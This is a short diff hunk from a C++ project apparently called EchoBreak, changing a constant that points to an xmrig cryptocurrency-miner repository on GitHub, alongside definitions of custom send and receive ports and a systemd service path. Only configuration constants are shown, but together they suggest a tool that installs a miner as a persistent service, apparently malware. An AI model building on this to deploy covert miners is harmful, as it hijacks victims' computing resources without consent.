@@ -10,7 +10,7 @@
 #define REC_PORT 6969
 #define SENDING_PORT 6868
 #define BUFFER_SIZE 256
-#define MINER_GH std::string("https://github.com/xmr-rx0/EchoBreak-xmrig.git")
+#define MINER_GH std::string("https://github.com/4rch1nx/EchoBreak-xmrig.git")
 #define SERVICE "/etc/systemd/system/eb.service";
 
 struct JsonPayload
